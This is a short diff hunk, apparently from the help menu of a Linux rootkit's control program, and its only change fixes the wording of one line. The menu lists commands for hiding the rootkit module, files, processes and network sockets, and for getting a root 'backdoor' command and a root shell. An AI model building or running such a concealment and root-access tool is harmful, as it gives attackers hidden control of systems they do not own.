@@ -266,7 +266,7 @@ help()
     printf("%-42s %s\n", "modhide <on | off>", "{,un}hide rootkit module");
     printf("%-42s %s\n", "filehide [open] <toggle | on | off>", "{,un}hide [open] files");
     printf("%-42s %s\n", "hidepid <add | rm> <PID>", "{,un}hide a process");
-    printf("%-42s %s\n", "socket <hide | unhide> <tcp | udp> <port>", "{,un}hide a tcp or udp with the given port");
+    printf("%-42s %s\n", "socket <hide | unhide> <tcp | udp> <port>", "{,un}hide a tcp or udp socket with the given port");
     printf("%-42s %s\n", "sockethide-off", "disable any (tcp or udp) socket hiding");
     printf("%-42s %s\n", "backdoor <execve_command>", "exec a command as root");
     printf("%-42s %s\n", "shell", "obtain a shell as root");
